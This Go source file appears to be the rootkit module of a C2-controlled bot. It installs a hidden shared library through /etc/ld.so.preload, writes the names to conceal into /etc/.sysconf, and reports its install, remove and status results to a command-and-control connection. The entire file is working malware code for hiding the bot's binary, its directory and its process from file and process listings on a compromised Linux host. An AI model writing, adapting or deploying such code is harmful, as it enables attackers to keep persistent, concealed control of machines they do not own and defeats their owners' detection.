//go:build withrootkit

package main

// ============================================================================
// ROOTKIT — LD_PRELOAD installer / uninstaller
//
// Installs a companion shared library (libproc.so) via /etc/ld.so.preload so
// that every subsequently exec'd process on the host inherits the hooks.
// The library hides: the bot binary, the storeDir, the lock file, and the bot
// process name by intercepting readdir/readdir64, stat/lstat, open/openat,
// fopen, and access inside glibc.
//
// Hidden patterns are written to /etc/.sysconf (one per line) so that the .so
// picks them up on constructor load without needing to know them at compile
// time.
//
// Build tag: withrootkit
// Companion C source: bot/rootkit_src/rootkit.c
// Compile to:        bot/rootkit_src/libproc.so
//   gcc -shared -fPIC -nostartfiles -o libproc.so rootkit.c -ldl
// ============================================================================

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// rootkitBlob holds the compiled LD_PRELOAD shared library (.so) as a raw
// byte slice.  In production builds this is populated by the build script
// (go:embed or direct injection).  When the slice is nil or empty the install
// command will abort with an informative error rather than writing an empty
// file to disk.
//
// rootkit blob embedded by build script
var rootkitBlob []byte // populated by go:embed in production build

// rootkitSoProd is the primary install path (requires root / world-readable lib dir).
const rootkitSoProd = "/usr/lib/libproc.so"

// rootkitSoFallback is used when /usr/lib/ is not writable (e.g. non-root
// installs where /etc/ld.so.preload can still reference absolute paths).
const rootkitSoFallback = "/tmp/libsys.so"

// rootkitConfPath is the hidden-pattern config read by the .so constructor.
const rootkitConfPath = "/etc/.sysconf"

// rootkitPreloadPath is the LD_PRELOAD hook list read by the dynamic linker.
const rootkitPreloadPath = "/etc/ld.so.preload"

// ============================================================================
// INSTALL
// ============================================================================

// shadowPadRootkitInstall writes the rootkit .so to disk, configures the
// hidden-pattern file, and registers the library with /etc/ld.so.preload.
//
// Steps:
//  1. Verify caller is root (uid 0); abort otherwise.
//  2. Confirm rootkitBlob is non-empty; abort otherwise.
//  3. Write blob to rootkitSoProd (/usr/lib/libproc.so); if that fails try
//     rootkitSoFallback (/tmp/libsys.so).
//  4. chmod 644 the .so so the dynamic linker can read it as any uid.
//  5. Write hidden patterns to rootkitConfPath (/etc/.sysconf):
//     storeDir, basename of current executable, binLabel, basename of lockLoc.
//  6. Append the .so path to /etc/ld.so.preload (idempotent — skips if already
//     present).
//  7. Run `ldconfig` if available so the linker cache is updated immediately.
//  8. Report success or failure to the C2 connection.
//
// Parameters:
//   - conn: Live C2 net.Conn for status reporting.
//
// Returns: error on unrecoverable failure (uid check, empty blob); nil on
// success or partial success where the error has already been written to conn.
func shadowPadRootkitInstall(conn net.Conn) error {
	deoxys("shadowPadRootkitInstall: starting rootkit install")

	// --- privilege check ---
	if os.Getuid() != 0 {
		msg := "rootkit install requires root (uid 0)"
		deoxys("shadowPadRootkitInstall: %s", msg)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, msg)))
		return fmt.Errorf("%s", msg)
	}

	// --- blob sanity check ---
	if len(rootkitBlob) == 0 {
		msg := "rootkitBlob is empty — rebuild with embedded .so"
		deoxys("shadowPadRootkitInstall: %s", msg)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, msg)))
		return fmt.Errorf("%s", msg)
	}

	// --- write .so to disk ---
	soPath := rootkitSoProd
	if err := os.WriteFile(soPath, rootkitBlob, 0644); err != nil {
		deoxys("shadowPadRootkitInstall: primary path %s failed: %v — trying fallback", soPath, err)
		soPath = rootkitSoFallback
		if err2 := os.WriteFile(soPath, rootkitBlob, 0644); err2 != nil {
			msg := fmt.Sprintf("failed to write .so to %s and %s: %v", rootkitSoProd, rootkitSoFallback, err2)
			deoxys("shadowPadRootkitInstall: %s", msg)
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, msg)))
			return fmt.Errorf("%s", msg)
		}
	}
	deoxys("shadowPadRootkitInstall: wrote %d bytes to %s", len(rootkitBlob), soPath)

	// Ensure the .so is readable by the dynamic linker for all users.
	if err := os.Chmod(soPath, 0644); err != nil {
		deoxys("shadowPadRootkitInstall: chmod 644 %s: %v", soPath, err)
		// Non-fatal — file was already written with 0644, carry on.
	}

	// --- build hidden-pattern list ---
	// Derive a canonical exe name for the pattern list.  Use the basename of
	// the current executable so the rootkit hides both the full path and any
	// directory listing entry.
	exePath, _ := os.Executable()
	exeBase := filepath.Base(exePath)

	patterns := []string{
		storeDir,
		exeBase,
		binLabel,
		filepath.Base(lockLoc),
	}

	// Deduplicate while preserving order.
	seen := make(map[string]struct{}, len(patterns))
	var unique []string
	for _, p := range patterns {
		if p == "" {
			continue
		}
		if _, ok := seen[p]; !ok {
			seen[p] = struct{}{}
			unique = append(unique, p)
		}
	}

	confContent := strings.Join(unique, "\n") + "\n"
	if err := os.WriteFile(rootkitConfPath, []byte(confContent), 0600); err != nil {
		msg := fmt.Sprintf("failed to write pattern config %s: %v", rootkitConfPath, err)
		deoxys("shadowPadRootkitInstall: %s", msg)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, msg)))
		return fmt.Errorf("%s", msg)
	}
	deoxys("shadowPadRootkitInstall: wrote %d patterns to %s", len(unique), rootkitConfPath)

	// --- hook /etc/ld.so.preload ---
	if err := shadowPadAddToPreload(soPath); err != nil {
		msg := fmt.Sprintf("failed to update %s: %v", rootkitPreloadPath, err)
		deoxys("shadowPadRootkitInstall: %s", msg)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, msg)))
		return fmt.Errorf("%s", msg)
	}
	deoxys("shadowPadRootkitInstall: %s updated", rootkitPreloadPath)

	// --- run ldconfig (best-effort) ---
	if ldconfigPath, err := exec.LookPath("ldconfig"); err == nil {
		if err2 := exec.Command(ldconfigPath).Run(); err2 != nil {
			deoxys("shadowPadRootkitInstall: ldconfig returned: %v (non-fatal)", err2)
		} else {
			deoxys("shadowPadRootkitInstall: ldconfig ran successfully")
		}
	} else {
		deoxys("shadowPadRootkitInstall: ldconfig not found, skipping")
	}

	// --- report success ---
	statusMsg := fmt.Sprintf(
		"rootkit installed: so=%s patterns=%d preload=%s",
		soPath, len(unique), rootkitPreloadPath,
	)
	deoxys("shadowPadRootkitInstall: %s", statusMsg)
	encoded := base64.StdEncoding.EncodeToString([]byte(statusMsg))
	conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
	return nil
}

// shadowPadAddToPreload reads /etc/ld.so.preload and appends soPath if it is
// not already listed.  The file is created if it does not exist.
// This function is called exclusively from shadowPadRootkitInstall.
func shadowPadAddToPreload(soPath string) error {
	existing, err := os.ReadFile(rootkitPreloadPath)
	if err != nil && !os.IsNotExist(err) {
		return err
	}

	for _, line := range strings.Split(string(existing), "\n") {
		if strings.TrimSpace(line) == soPath {
			deoxys("shadowPadAddToPreload: %s already in preload, skipping", soPath)
			return nil
		}
	}

	f, err := os.OpenFile(rootkitPreloadPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = fmt.Fprintf(f, "%s\n", soPath)
	return err
}

// ============================================================================
// REMOVE
// ============================================================================

// shadowPadRootkitRemove uninstalls the LD_PRELOAD rootkit.
//
// Steps:
//  1. Remove /usr/lib/libproc.so (primary path).
//  2. Remove /tmp/libsys.so    (fallback path).
//  3. Remove /etc/.sysconf     (hidden-pattern config).
//  4. Read /etc/ld.so.preload, strip lines referencing either .so path.
//     If the result is empty, remove the file entirely; otherwise rewrite.
//  5. Report each action and overall status to the C2 connection.
//
// Parameters:
//   - conn: Live C2 net.Conn for status reporting.
func shadowPadRootkitRemove(conn net.Conn) {
	deoxys("shadowPadRootkitRemove: starting rootkit removal")

	var steps []string

	// --- remove .so files ---
	for _, soPath := range []string{rootkitSoProd, rootkitSoFallback} {
		if err := os.Remove(soPath); err == nil {
			deoxys("shadowPadRootkitRemove: removed %s", soPath)
			steps = append(steps, "removed "+soPath)
		} else if !os.IsNotExist(err) {
			deoxys("shadowPadRootkitRemove: remove %s: %v", soPath, err)
			steps = append(steps, fmt.Sprintf("warn: remove %s: %v", soPath, err))
		}
	}

	// --- remove hidden-pattern config ---
	if err := os.Remove(rootkitConfPath); err == nil {
		deoxys("shadowPadRootkitRemove: removed %s", rootkitConfPath)
		steps = append(steps, "removed "+rootkitConfPath)
	} else if !os.IsNotExist(err) {
		deoxys("shadowPadRootkitRemove: remove %s: %v", rootkitConfPath, err)
		steps = append(steps, fmt.Sprintf("warn: remove %s: %v", rootkitConfPath, err))
	}

	// --- clean /etc/ld.so.preload ---
	if data, err := os.ReadFile(rootkitPreloadPath); err == nil {
		lines := strings.Split(string(data), "\n")
		var clean []string
		for _, line := range lines {
			trimmed := strings.TrimSpace(line)
			if strings.Contains(trimmed, "libproc.so") || strings.Contains(trimmed, "libsys.so") {
				deoxys("shadowPadRootkitRemove: stripping preload line: %q", trimmed)
				continue
			}
			clean = append(clean, line)
		}
		result := strings.TrimSpace(strings.Join(clean, "\n"))
		if result == "" {
			if err2 := os.Remove(rootkitPreloadPath); err2 == nil {
				deoxys("shadowPadRootkitRemove: removed empty %s", rootkitPreloadPath)
				steps = append(steps, "removed empty "+rootkitPreloadPath)
			} else {
				deoxys("shadowPadRootkitRemove: remove %s: %v", rootkitPreloadPath, err2)
			}
		} else {
			if err2 := os.WriteFile(rootkitPreloadPath, []byte(result+"\n"), 0644); err2 == nil {
				deoxys("shadowPadRootkitRemove: rewrote %s", rootkitPreloadPath)
				steps = append(steps, "cleaned "+rootkitPreloadPath)
			} else {
				deoxys("shadowPadRootkitRemove: rewrite %s: %v", rootkitPreloadPath, err2)
				steps = append(steps, fmt.Sprintf("warn: rewrite %s: %v", rootkitPreloadPath, err2))
			}
		}
	} else if !os.IsNotExist(err) {
		deoxys("shadowPadRootkitRemove: read %s: %v", rootkitPreloadPath, err)
	}

	// --- report ---
	summary := "rootkit removed\n" + strings.Join(steps, "\n")
	deoxys("shadowPadRootkitRemove: %s", summary)
	encoded := base64.StdEncoding.EncodeToString([]byte(summary))
	conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
}

// ============================================================================
// STATUS
// ============================================================================

// shadowPadRootkitStatus checks whether the rootkit appears to be active and
// reports findings to the C2 connection without modifying any state.
//
// Checks performed:
//   - Whether rootkitSoProd or rootkitSoFallback exists on disk.
//   - Whether rootkitPreloadPath exists and contains a reference to either .so.
//   - Whether rootkitConfPath (hidden-pattern config) exists.
//
// Parameters:
//   - conn: Live C2 net.Conn for status reporting.
func shadowPadRootkitStatus(conn net.Conn) {
	deoxys("shadowPadRootkitStatus: checking rootkit state")

	var lines []string

	// --- check .so presence ---
	soFound := ""
	for _, soPath := range []string{rootkitSoProd, rootkitSoFallback} {
		if _, err := os.Stat(soPath); err == nil {
			soFound = soPath
			lines = append(lines, fmt.Sprintf("so_present: %s", soPath))
			deoxys("shadowPadRootkitStatus: found .so at %s", soPath)
			break
		}
	}
	if soFound == "" {
		lines = append(lines, "so_present: false")
		deoxys("shadowPadRootkitStatus: .so not found on disk")
	}

	// --- check /etc/ld.so.preload ---
	preloadActive := false
	if data, err := os.ReadFile(rootkitPreloadPath); err == nil {
		content := string(data)
		if strings.Contains(content, "libproc.so") || strings.Contains(content, "libsys.so") {
			preloadActive = true
			lines = append(lines, fmt.Sprintf("preload_hooked: true (%s)", rootkitPreloadPath))
			deoxys("shadowPadRootkitStatus: preload hook active")
		} else {
			lines = append(lines, fmt.Sprintf("preload_hooked: false (file exists but no hook in %s)", rootkitPreloadPath))
			deoxys("shadowPadRootkitStatus: preload file exists but hook absent")
		}
	} else if os.IsNotExist(err) {
		lines = append(lines, "preload_hooked: false (file absent)")
		deoxys("shadowPadRootkitStatus: %s does not exist", rootkitPreloadPath)
	} else {
		lines = append(lines, fmt.Sprintf("preload_check_err: %v", err))
		deoxys("shadowPadRootkitStatus: read %s: %v", rootkitPreloadPath, err)
	}

	// --- check pattern config ---
	if _, err := os.Stat(rootkitConfPath); err == nil {
		lines = append(lines, fmt.Sprintf("conf_present: %s", rootkitConfPath))
		deoxys("shadowPadRootkitStatus: pattern config present")
	} else {
		lines = append(lines, "conf_present: false")
		deoxys("shadowPadRootkitStatus: pattern config absent")
	}

	// --- overall verdict ---
	if soFound != "" && preloadActive {
		lines = append(lines, "status: ACTIVE")
	} else if soFound != "" || preloadActive {
		lines = append(lines, "status: PARTIAL (inconsistent state)")
	} else {
		lines = append(lines, "status: NOT_INSTALLED")
	}

	report := strings.Join(lines, "\n")
	deoxys("shadowPadRootkitStatus: %s", report)
	encoded := base64.StdEncoding.EncodeToString([]byte(report))
	conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
}

// ============================================================================
// DISPATCH
// ============================================================================

// dispatchRootkit routes `!rootkit` sub-commands to their respective handlers.
//
// Supported sub-commands:
//
//	!rootkit install  — install the LD_PRELOAD rootkit (requires root)
//	!rootkit remove   — remove all rootkit components
//	!rootkit status   — report current rootkit state without modifying anything
//
// Parameters:
//   - conn:   Live C2 net.Conn for response delivery.
//   - cmd:    The primary command token (always "!rootkit" at this call site).
//   - fields: Tokenised command fields, including cmd at index 0.
//
// Returns: error for unknown sub-commands; nil otherwise (per-operation errors
// are written to conn rather than returned so the dispatch loop keeps running).
func dispatchRootkit(conn net.Conn, cmd string, fields []string) error {
	deoxys("dispatchRootkit: cmd=%s fields=%v", cmd, fields)

	if len(fields) < 2 {
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !rootkit <install|remove|status>")))
		return nil
	}

	sub := strings.ToLower(fields[1])
	switch sub {
	case "install":
		return shadowPadRootkitInstall(conn)
	case "remove":
		shadowPadRootkitRemove(conn)
	case "status":
		shadowPadRootkitStatus(conn)
	default:
		msg := fmt.Sprintf("unknown rootkit sub-command: %q — use install|remove|status", sub)
		deoxys("dispatchRootkit: %s", msg)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, msg)))
		return fmt.Errorf("%s", msg)
	}
	return nil
}
